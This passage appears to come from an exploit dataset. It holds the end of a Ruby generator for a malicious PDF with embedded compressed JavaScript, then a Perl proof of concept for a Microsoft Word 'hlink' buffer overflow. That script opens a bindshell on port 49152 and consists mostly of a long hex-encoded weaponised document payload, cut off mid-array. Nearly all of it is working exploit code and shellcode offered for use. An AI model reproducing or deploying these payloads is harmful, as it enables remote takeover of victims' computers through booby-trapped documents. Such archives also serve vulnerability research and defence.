""eJzj1ZA6peCnxVrNzHD3v1xSmdpmTV4AOosGFg=="")     add_compressed(33, ""eJzjjdb3dHZ2SixOTVEwslQwUAiK5QUANnUE/Q=="")     add_compressed(29, ""eJwBEQHu/g08PC9GaWx0ZXIvRmxhdGVEZWNvZGUvTGVuZ3RoIDIxNi9OIDE+PnN0cmVhbQ1IiWJgYJzh6OLkyiTAwJCbV1LkHuQYGREZpcB+noGNgZkBDBKTiwscAwJ8QOy8/LxUBgzw7RoDI4i+rAsyC1MeL2BNLigqAdIHgNgoJbU4GUh/AeLM8pICoDhjApAtkpQNZoPUiWSHBDkD2R1ANl9JagVIjME5v6CyKDM9o0TB0NLSUsExJT8pVSG4srgkNbdYwTMvOb+oIL8osSQ1BagWagcI8LsXJVYquCfm5iYqGOkZkehyIgAoLCGszyHgMGIUO48QQ4Dk0qIyKJORyZiBASDAAEnGOC8NZW5kc3RyZWFtDYkear8="")     add_compressed(36, ""eJzjjdb3dHZ2SixOTVEwNlAwUAiK5QUANj4E9Q=="")     add_compressed(30, ""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"")     add_compressed(38, ""eJxNjbEOgjAYhJ+Ad/hHWPgplIoJaVIwaGIwRGsciAtYCFGLQx18e1vi4HDDXe6+8/IcBdAEIjiiaKw7QEqc4xw3wsedKmYgMcjBhmOAFVCsJBZGYzUAS9OEYb23u2LbkjCCn65YCr98TP0dnipA2QCxwAZitjwdVW/ayFajkBGasQwYIWGSUVitY7c+vTvzeSm8TLdRGZR+Z/SCqx3t/I92NaH1bDj3vvt1NZc="")     add_compressed(43, ""eJzjtbHR9wpWMDFTMFAI0g/W90osSwxOLsosKLGz4wUAaC0Hzw=="")     add_compressed(51, ""eJxNjtEKgkAQRb9g/mG/wHHRTEF8kPCpyDIoEB/UJivQrXUF+/t2Y4seLnPhzj1ciGNMUzGXruMyo4Bzxwt9tozMXVSYCdkfXg9iHNc0dOrKAh83tZK3ueS2ZPTnK9zTKCbZ0qjxuRRtQarEfJVVSYLF1CjN+4DRkPG0be7UqiQZlaS6B8460CC7xQu/YziTBBd46gfOAjeyYRj9wiMMsAMazpb0BnLmPE4="")      js = Zlib::Deflate.deflate(js)     add_object(46, ""\x0d<</Filter[/FlateDecode]/Length #{js.length}>>stream\x0d#{js}\x0dendstream\x0d"")      add_compressed(8, ""eJzjtbHRd84vzStRMNR3yywqLlGwVDBQCNL3SYQzAxKLUoHy5mBOSGZJTqqGT35yYo6CS2ZxtqadHS8AmCkTkg=="")     add_compressed(9, ""eJzjtbHRd0ktLok2MlMwUAjSj4iMAtLmlkYKeaU5ObH6AYlFqXklChZgyWBXBUNTMCsksyQnVePff4YshmIGPYYShgqGEk07O14AWScVgw=="")     add_compressed(17, ""eJzjtbHR90vMTS2ONjZVMFAIUjAyAFGxdna8AF4CBlg="")     add_compressed(18, ""eJzjtbHR90vMTS2ONrRUMFAIUjAyAFGxdna8AF4gBlo="")     add_compressed(19, ""eJzj1UjLzEm10tfXd67RL0nNLdDPKtYrqSjR5AUAaRoIEQ=="")     add_compressed(20, ""eJzjtbHRdw7RKEmtKNEvyEnMzNPU93RRMDZVMFAI0vePNjIDMWL1g/WDA4DYU8HIECwTovHvP0MWQzGDHkMJQwVDiaZ+SLCGi5WRgaGJgbGxoaGhsampUZSmnR0vAOIUGEU="")     add_compressed(21, ""eJzjtbHRdwxVMLRUMFAI0g8J1nCxMjIwNDEwNjY0NDQ2NTWK0rSz4wUAmbEH3g=="")     add_compressed(39, ""eJzjtbHRd0osTnXLzyvR90jNKUstyUxO1HXKz0nRd81Lzk/JzEtXMDFVMFAI0vdLzE0FqnHK1w8uTSqpLEjVDwEShmBSH2SAnR0vACeXGlQ="")     add_compressed(47, ""eJzjtbHRd0osTnXLzyvR90jNKUstyUxO1HfNS85PycxLVzAxVTBQCNL3S8xNBUvrB5cmlVQWpOqHAAlDMKkP0mtnxwsAqd8Y1w=="")     add_compressed(48, ""eJzjtbHRd0osTnXLzyvRj0osSHPJzEtPSiwp1vdLzE0Firgk6QeXJpVUFqTqhwAJQzCpD1JuZ8cLAJhsFTA="")     add_compressed(45, ""eJxNk81u2zAMx5+g75AnGJe0yFKgKGB0PgQYlsOaQzfswEi0LUSWUn1ky55+tJiovkQm+f+RFMXcPT3BV9N1FMgpir9WD3AIdCZQGLwDZYLKY2fpL2ifUClyCYbsegx5tJgT+N47OkIwrodkrKbF/SO8Z58ossvS4nENfcAzLZarDRyytZRAY99TuB76YIGsNadoItCoMQ5Arhyd9ZwYuoAqGW6nz8aWtJa69GEF0w8JRuNyhBOFNPgc0Wlpg9MfMFI1CnozhCzWh3/mLOkLngJqGjEcoTPcF3yLdupw18IPGdWbNjzE6Q4/xcEDsxSjAStSTxAl8q8ci+X6M7Q5eP54AJXD9AQXNtb8BP5I7oCBrQ3UxMqfLtKcD7ojvrBxPNcvK7C+Nwqt8wk+8Y+mDgL1JvJlSMOIqjREfSCCk81RZpX++Jh5YMYHSAPHqoUqJ4IxL5abeyg+PT19yaZIG2sR+N2rnvsZMapsS0ObzRR8zxiYmD4HtJ1UuDrjYvm4gqYsBjRSrZktW1NWCZp69aYsWNPCy618K3ArcDuD20ptRbMVzXam2VZNmwb4LuV2It+JfDeT766CSo3ZJnOyF9jJ4+4F3Qu6n6H7yrxJ8HXwgVeZwsg7erARUFiUMM5YlLJYU2AZA/Lf8zYGEpgEphlMlTKiMaIxM42pGuIxOCnnRe5F7mdyfxVUSpuzmRwyhCxgFjDPwFyJiwRTGcLl5v4Nr5cTv6JTnNv1z893/wElCbzZ"")     add_compressed(23, ""eJxNzLEKgzAQgOEn8B2ymVCqd4npUEQQXQsdCp0Tc4Ol9Ep6Qh+/gg7d/+8v2rYeMgWZ+TUGIT2eLWADziE65z0ewJYApdkqzrpPHEn1U+YYRCFWYOoLp3/sV2yxsacj+A1fM6dlolXv7k5RDeEtS6b9cZvlSfrxqeQrpuuKH+VYK70="")      @xref_offset = @pdf.length     @pdf << xref_table << trailer(25) << startxref      @pdf   end  end","['< 11.2.0', 'less than 11.2.0']",1
1999,"Microsoft Word 2000/2003 - Hlink Local Buffer Overflow #!/bin/perl # # Microsoft Word hlink 0-day by SYS 49152 #  # this POC works only with: # win 2ksp4 ENG + word 2000/XP all versions. 		 # win XP ENG sp1/sp2 + word XP 2002 SP3. # # Word 2003 is not vulnerable. # # bindshell on port 49152 #  # hey kids.. I hope you know how to use winzip :-) # # to get in contact with me.. gforce@operamail.com # I always like to talk with skilled people..    my $all = ""\x50\x4B\x03\x04\x14\x00\x00\x00\x08\x00\x99\x3D\xE9\x34\xD6\xA6\xCB\xA3\xA9\x0D\x00\x00\x00\x72\x00\x00\x0D\x00\x00\x00\x77\x6F\x72\x64\x68\x6C"". ""\x69\x6E\x6B\x2E\x64\x6F\x63\xED\x5D\x0B\x70\x54\xD5\x19\xFE\xEF\x3E\x42\x36\xC9\x62\x48\x42\x40\xC4\x70\xC1\xA0\xE1\x91\x64\x93\x00\x42\x50\x0C"". ""\x49\x40\x12\x5E\x09\x01\x91\xE9\xD4\xB0\x64\x77\xB3\x1B\x36\xBB\xCB\xEE\x46\x12\xB5\xD3\xB4\x56\x84\x2E\x3A\xB1\xD4\xB1\x8E\xF8\x6A\xE9\x60\x05"". ""\x3A\x58\xDB\x19\xA6\xE3\xB4\xF8\x9E\x56\xAB\x69\x3B\x52\x6D\x3B\x0C\xA2\x54\x2D\x6A\x91\x50\x29\x33\xCA\xED\xF7\xDF\x73\x6F\xB2\x6C\x08\x4B\x22"". ""\x0C\xAF\xFB\x9D\xF9\xEE\x79\xDE\xFF\x3F\xE7\xDC\x73\xEF\x79\xEC\x39\x49\xF7\xDB\x23\x0E\x3C\xFD\xDC\x98\xF7\x29\x01\x73\xC8\x4C\x27\x15\x1B\xA5"". ""\xC4\x85\x49\xE0\x34\xDD\x93\x49\x34\x43\x0B\x3B\xA9\x28\x0A\x07\x95\x81\x8A\x81\x4B\x0A\x9F\xFE\xFC\x45\xB2\x56\xD8\x2C\x44\xFF\xCB\xFA\x7D\xEF"". ""\x93\x05\xF0\xE0\xCB\xB3\x89\x86\xD3\x9A\x96\x35\x2D\x9F\xCF\xFF\x7C\x3E\xF5\x83\xCD\x92\x4B\x85\x63\x88\x36\x4F\x15\x2C\x4F\xEF\x9F\x26\x1E\x8A"". ""\x72\x55\x52\xB7\x8E\x8D\xEA\xF5\x05\x13\xF5\xDA\xF1\xEE\x81\xEC\x9C\x38\x09\xDD\x5A\xF8\x8F\xAD\x03\xDB\x19\xB0\x9F\xD2\x6C\x3D\xFD\x93\xC3\x88"". ""\x8E\xA2\x59\xEF\x41\x78\x01\xFC\x07\xB4\xF4\x83\xB5\xF3\x20\x87\x45\xCA\xC3\x84\xFF\x6C\xEC\x7C\xD8\x0F\xD9\x88\x96\xE1\xC6\x0F\x50\x9B\x95\xF0"". ""\x57\x23\x7C\x24\xF5\x87\x5E\x6E\x5D\x5F\x22\x92\xE5\xAF\x7A\xD8\xA9\xE9\x13\xEB\x33\x51\xAE\xEE\x5F\x85\xFB\x72\x61\xFF\x4B\xFB\x34\x24\xDA\x9C"". ""\x8E\x1B\x4B\xA2\x9C\x44\x7F\x5E\x82\x7E\xFD\xFE\xC1\xE2\x6C\xE5\xE9\xFE\xC4\x72\x0E\x15\xF1\xE5\x65\xEC\xD4\xDA\x51\x45\x75\xB0\xDC\xF3\xB3\xD7"". ""\x24\x3D\x9D\xDE\xDE\xAE\x47\xFA\x07\xA9\x7F\xBE\xF4\x7C\x07\x61\x3B\x48\xB4\x3F\x8A\x4B\x37\x31\x43\xD8\xBF\x86\x7F\x6C\x9C\x3F\x51\x8E\xDE\x7E"". ""\xBB\x13\xCA\x37\x90\x9D\x08\x5D\xAE\x0E\x3D\x1D\xEB\x99\x49\xFD\xDB\x4F\x62\xF9\x07\x6A\x87\x89\x48\xD6\x1E\x75\x3B\xBE\x3C\xAF\x98\xFA\xEA\x51"". ""\x47\x77\x8A\x68\x87\x89\xE5\xD6\xD3\x99\x48\xEA\x7D\x06\x06\x0C\x18\x38\x1D\xB2\xE5\x05\xAB\xEA\xE6\x2D\x5B\x54\xB3\x64\xA1\x3C\xC1\x1B\x8D\x86"". ""\xCA\x8B\x8B\x9D\x67\x05\xD7\x65\x04\xB7\x81\x73\x0E\x8F\x81\x0B\x86\xE6\xF3\x8C\x0B\xA8\xDA\xC0\x59\xC0\x6B\xC0\x40\x12\xF8\x0C\xA8\x58\x9B\x2C"". ""\xC1\x40\x28\x9E\x20\xE5\x04\xFD\xFE\x8E\xF1\x23\x23\x5E\x5F\x74\xBC\xDC\xB0\xAA\x41\x9E\x36\xAB\x64\x7A\xA9\x6C\x5B\xEC\x6B\x0A\x07\x23\x41\x4F"". ""\x54\x5E\x19\x0C\xBB\x64\xAF\xDF\x17\x58\x2B\x3B\x0A\x5D\xCE\x0E\xBB\x7D\x8D\x2F\xE0\x8A\x78\xDD\x7E\xBF\x1C\x0C\xC8\xA1\x60\x38\xAA\xDD\x64\xB7"". ""\x37\xF9\x7D\x4D\x6B\x39\x54\x95\x2A\x17\xD8\xED\x51\xAF\x2F\x22\xD7\x2D\xAD\x92\xD7\x07\xC3\x6B\x23\x88\xF2\x77\xC8\xEB\x7D\x51\x6F\xB9\x7D\xA5"". ""\x2F\x20\x97\xAE\x8D\x84\xA6\xC9\xF3\x96\xDC\x2A\x4F\x11\x7A\x4A\x1D\x0E\x47\xF1\xED\x75\xB2\x13\xC2\xEF\x74\x87\x23\xBE\x60\x20\x52\xA4\x26\x45"". ""\x60\x24\x54\x52\x1C\x09\x95\xC6\xA7\x47\x28\x6E\x29\x45\x54\x59\x91\xDD\xAE\x8B\x28\x93\xA1\x34\x10\x8C\xCA\x77\xB6\xF9\x03\xEE\xB0\x73\x8D\xDF"". ""\x8D\xD8\x68\x50\x6E\x76\x47\x65\xC8\x6A\x0A\x06\xA2\xCE\xA6\xA8\x9A\x11\xB9\xD5\x5D\x54\x24\x9F\x32\x88\x6C\x75\xFA\xFC\xD1\x60\x79\xB3\x27\x18"". ""\x6E\x72\x57\x04\x43\x90\xC0\x41\x45\x4D\xC1\xD6\x09\xB2\x94\x73\xBA\xF0\x91\x76\x7B\x24\xEA\xEC\x90\xA3\x6D\x01\xB7\x0B\xF2\x64\xB9\x35\x18\x76"". ""\x43\x57\xD4\x1D\x76\x47\xA2\xBE\x40\xB3\x8C\x9A\x08\x34\x47\x64\x27\x82\x51\x41\x51\xAF\x5B\x5E\x8F\x1B\x90\x56\xAB\xA4\xA6\xA0\xCB\xCD\xF9\x86"". ""\x74\xD9\xED\x6A\x6B\x72\x46\x51\x78\xA7\x5F\x0E\xB5\x85\x43\xC1\x88\x5B\xAD\xBA\xA9\x72\x8D\xEC\x0A\x06\x7E\x14\xE5\x0A\x0A\xAE\x97\x9D\x81\x8E"". ""\x60\xC0\x2D\xA3\x64\x6D\x48\xE1\x43\x70\xB3\xD3\x17\x88\x44\xE5\xB9\x4B\x56\xC9\x7E\xE7\x7A\x94\xBA\x12\xEA\xE5\x65\xEE\x66\x67\xD8\x15\x91\xE1"". ""\xEF\x7D\xC6\x76\x7B\xB2\x91\xF5\x25\x02\xCC\xA2\xA5\x54\xA2\x9B\x47\x10\xCD\x01\x6F\x01\xAB\xC1\x79\xE0\x0A\xD0\x0D\xB6\x80\x8F\x81\x5B\xC1\x27"". ""\xC0\xED\xE0\x41\xF0\x03\xF0\x28\xF8\x25\x98\x96\x45\x94\x0E\x16\x80\xF3\xC0\xF9\x60\x10\x0C\x81\xEB\xC0\xFB\xC0\x0D\xE0\xB8\x6C\xA2\xC2\x6C\xB1"". ""\xB6\x78\xBC\xE7\xE3\xE3\x07\x8F\xEF\xFF\xFB\xFE\x9E\xBF\xF6\xBC\xBD\xBF\x67\xFF\x1B\xFB\x71\x3D\xDE\xB3\x17\x81\x3D\x2F\xF4\x24\xCB\xF8\xA5\x8D"". ""\x94\x5C\xEF\x86\xD5\x0A\xD1\x48\x53\xEA\xF7\xCC\x2D\x7F\x46\xCD\xA4\xA4\x4A\xB9\xDE\xED\x95\x5B\x68\x45\xAA\x84\x58\x4B\xEA\xFB\x6A\xAA\x07\x26"". ""\xFE\x8E\x28\xC3\xD6\x62\xA6\xDA\x23\x22\x9E\x43\xEF\x2C\xAC\x51\xED\xC6\x75\x8F\xA2\xEE\x45\xB8\xA3\x36\x53\x97\xA7\x6A\x38\x55\x9E\x7A\xE7\x55"". ""\x22\xAA\x37\x9C\xF2\xF8\xF9\xAF\xC3\xF3\x0B\x83\x31\x70\x33\xF8\xB8\xF6\x9C\xF7\x68\xCF\x38\xFE\xD9\x4E\x02\xEF\x07\x37\x82\x2F\x81\x2F\x83\x79"". ""\xD9\xE2\xB9\x16\x81\xC5\xE0\x2C\xED\xF9\x7E\x1D\x5F\x60\xC3\x93\xE0\xB9\xE0\xE0\xD5\xB1\x5C\x7D\x9D\xFF\xE2\xCA\x9A\x81\xF3\x0F\x8B\x85\x24\x49"". ""\x9A\x42\x25\x5D\x5E\x69\xB6\xC3\x34\x6E\x77\x77\xB1\xBC\xFB\xC0\xCD\xE3\x77\x07\x2C\x13\xC0\xEB\xBA\x02\x96\x7C\x70\xE2\x6E\xA2\x51\xF0\x8F\x06"". ""\x93\x89\x34\x70\xC9\x81\x7B\x9E\xEA\x64\x89\x92\xA1\xFB\x0F\xFF\xEE\x38\xF1\xDB\xB7\x46\x6C\xFE\x3E\x3D\x4B\x0B\x7F\x91\xCE\x2B\xF1\x66\xF0\x40"". ""\x42\xF8\x6A\x28\xF3\x52\x14\x26\x44\xE5\x54\x0C\xE3\x3C\x87\xC6\x65\x98\x8B\xD2\xB8\x0D\x63\x98\x4B\xC0\x78\x0C\x63\x98\x2B\xD0\x34\x5F\xE2\x26"". ""\x59\xF9\x2E\xCF\x52\x1B\xC6\x30\xE7\xC6\x78\x0D\x63\x18\xC3\x9C\x67\x73\x38\xAD\xAB\x6B\xF1\x81\xE7\x1C\xAA\x3B\xA5\xAB\xCB\x53\xBB\xE4\x9E\xAE"". ""\xAE\xAF\x5A\x0E\x2F\xFE\xF8\x84\xA2\x28\xAB\x63\xFE\xFC\xFC\xD8\xBC\x9B\x62\xF7\x58\xDB\xA5\xFF\xC4\x96\x8E\x8E\x35\xCA\xD2\xE1\x9A\xD8\xB4\x98"". ""\xF4\x79\xC9\xDE\x47\x77\xFE\x60\x6F\x74\xD8\x8B\x7F\xB4\x4B\x2F\x1D\x3E\x36\x7B\x79\x7E\x41\xDB\xA1\x58\x63\xBE\x74\xD8\x13\xCB\x58\x18\x6B\x1C"". ""\x2B\x1D\x36\x4F\x8D\x6D\xF2\xE7\x8F\x75\xBE\x5C\xF2\x0F\x57\xAC\xCA\x11\xAB\xC8\x88\x85\xC6\xEE\x8A\x55\xA4\xDE\xE1\x7D\x70\xC9\xF0\x4F\xEB\x94"". ""\x7D\x9E\x06\x8F\xB7\xAC\xD4\xBB\x3E\x52\xDA\xB8\x5C\xE9\xF6\xBE\xF1\xD9\x57\xB3\x11\xDA\xB8\xE9\x90\xE7\x7B\x9F\xA5\x9A\x56\xB4\x98\x10\xF8\x9E"". ""\xED\xBF\xBB\x56\x2A\xFB\x1A\x18\x55\x30\x4A\xB7\xC7\xBB\x97\x3C\x0D\x9B\xDE\x7F\xD8\xBB\x6D\x4C\xE8\x75\xC4\xB5\x64\xD6\xAF\x40\xCA\x6D\xBB\x8A"". ""\x3E\xE1\x94\xEC\x3E\x54\xB3\xA1\x06\xEE\xBA\xE5\xCB\xE1\xDB\xE2\xFD\xA8\xE3\xB5\x0E\x78\xE1\xF6\xB4\xB8\x3C\xDE\xA6\xD6\x4D\x87\x5A\xEA\x56\x4D"". ""\x7A\x73\xD3\x47\x2D\xD5\x9B\x0E\x96\xEC\xED\x79\xF6\x64\x65\xE1\xC9\xCA\xA9\x5B\x1E\xB8\x6B\xE6\x8E\x1D\x3B\xBC\xE1\x93\xCF\xE7\x2A\x6D\xD5\xCA"". ""\xBE\x6F\xAD\x5C\x56\x5F\x5F\xDF\x22\xD5\xD7\xAF\xA8\x87\xD8\x5D\xEF\x59\xDF\x6A\x80\x42\x45\xB9\x51\xE9\x8E\xAD\xFC\xEA\xDE\x57\x5C\xCA\xBE\x65"". ""\x88\x38\xF2\x43\x4B\x23\x22\x94\x6E\xF2\x19\xE6\x22\x36\x6B\x93\xA6\x38\xD7\xA6\x98\x88\xFE\x46\xE7\x69\x41\x6B\x14\x89\x7D\xD8\x3C\xE0\x0C\x52"". ""\x98\x9A\x30\x65\xAC\x80\x2B\x04\x3B\x4C\x4E\x6A\x05\x7D\xE4\xA7\x22\xC4\x04\xE1\xEB\xBF\xFC\xC5\xBB\x68\xF5\x54\x51\xA4\x29\x1F\x84\xAC\xF3\x85"". ""\x1C\x94\x29\x8B\x24\xDA\x4A\x57\xA9\x4B\x76\x02\x2E\xA2\x8A\x2F\x14\x13\xEC\xBE\x4D\xC1\x29\xB4\x44\xCD\x2B\xE7\xCD\x0F\xFF\x08\xD0\x9C\x4F\x93"". ""\xF3\xA5\x92\x7C\x9A\x9B\x4F\xCE\x7C\xA2\x29\x54\x39\x99\xAA\x6A\x47\xD3\xD2\x5A\x0B\xD5\xD5\x5A\xA9\x1E\xF6\x1D\xB5\x29\xD4\xB8\x40\x21\x67\x6D"". ""\x0E\xB5\x2E\xB0\x59\x22\x60\x74\x81\xD2\x3F\x2F\xFC\xE0\xE6\xD2\x51\xE5\x69\xD8\x19\xBD\x7B\x77\x73\xE1\xE3\xC9\xB9\x93\xDA\xD4\x7A\x93\xA9\x0E"". ""\x6E\xAE\xA5\x66\xF5\x1A\xC2\x07\x55\xA6\xF9\xC8\x5B\x00\xB1\x8C\xDB\x50\x77\x3D\xCA\xF3\xB0\xFB\xA4\x64\xD0\x72\xA4\x5D\x03\x09\x6E\xA4\x3E\xB5"". ""\x24\x32\x95\xDF\x96\x4E\xA3\xBE\x44\xF9\xA7\xED\x4B\x21\xC9\xAA\x3B\xD2\xCC\x7E\x72\x72\xB0\x89\xF8\x68\x43\x01\x9A\xF4\x31\xE5\x45\x3E\x15\xD0"". ""\x2B\x77\x98\x2A\x4B\xA6\x45\xD0\x19\x51\xF5\x9B\xB4\x3A\xAB\xA5\x93\x4B\x8F\x2A\x5F\xC0\xEE\xAB\xC3\xAB\x51\xBE\x35\x48\xE7\x44\xCA\xBB\xA8\x90"". ""\x1A\x60\x3B\x91\x6F\x97\x5A\x22\x17\x62\x9A\x50\x9A\x30\x64\x79\xD4\x98\xB0\x56\xA2\x19\xB4\xA2\xE2\xA8\x22\x49\x33\xE2\x64\xD9\x68\x01\x75\x68"". ""\x2D\xC6\x8F\x3B\x02\xC8\x1D\x97\xB3\x72\xB2\x2D\xE4\x25\xEA\xA4\x39\x93\x91\xBE\xB2\x42\xA2\xAC\x84\xFB\x2A\x91\x63\x17\xEE\x95\x51\x27\x6E\x6A"". ""\x57\x75\xA4\xE1\x79\x66\x6F\x43\x7B\xD8\xD6\x4E\x5C\xD2\xE2\x8A\x11\xD2\x04\xA9\x20\xEE\x3E\xCB\x29\x65\xCC\x22\xF1\x60\xB9\x94\x12\x95\x4A\xF1"". ""\xA5\x4C\xA5\x2A\xF5\xB9\x44\x91\x9E\x9F\x4A\x09\xC2\xEC\x94\x0D\xF9\xED\xAA\xFC\x8C\x7C\xE4\x89\x66\xA4\x4A\x55\x68\x11\xDF\x4E\x95\x58\x0E\x37"". ""\x8E\x22\x55\x56\xA5\x54\x14\x27\xCB\x4A\x35\x6A\xFD\x70\x3E\xD9\x97\xA3\xDE\x2D\x74\x33\xF8\xCC\x09\x5C\x63\x38\x7F\x7C\x9E\x85\xC3\xD6\xD9\x88"". ""\xC2\x60\x0C\xDC\x0C\x3E\x0E\x3E\x01\xEE\x01\x3F\x00\xD3\xD2\x88\xD2\xC1\x02\x70\x12\x78\x3F\xB8\x11\x7C\x09\x7C\x19\xCC\x83\xCC\x71\x60\x11\x58"". ""\x0C\xCE\x02\x6F\x02\x7F\xC2\xC2\x1D\x5A\xC6\x3A\x35\x6A\x18\x74\x5C\xEA\x45\x14\x47\x67\x88\x3B\xD3\x7D\x8E\x21\xC6\xC9\xC2\x73\x4E\xF3\x92\x79"". ""\x86\x38\x59\x78\xCE\xA9\xCC\xF3\x78\x9F\xFE\x9B\x6C\x5A\x9C\x3B\x3D\xCE\xAD\xBF\x1D\x73\xD0\x96\xAB\xC1\x79\x48\x18\x02\xEF\x4B\x13\xEF\x43\xF6"". ""\xED\x39\xCA\xC8\x4E\x71\xE5\x74\xB7\x20\x4D\x0D\xE8\x06\x5B\xC0\xB5\x60\x48\x7B\x47\xEE\x06\x1F\x06\x1F\xB5\x89\x36\x3E\x8C\xC6\x6A\xB4\xC4\xB9"". ""\x75\x29\x55\xAC\x4D\x93\xB6\xD0\xD6\xF7\xA6\xDD\xAD\xBD\x69\x0F\x69\x6F\xDA\x4F\x6D\xE2\xCD\x9A\xA2\xBD\x59\x9B\xC1\x47\xC0\xC7\xB4\x37\xEC\x75"". 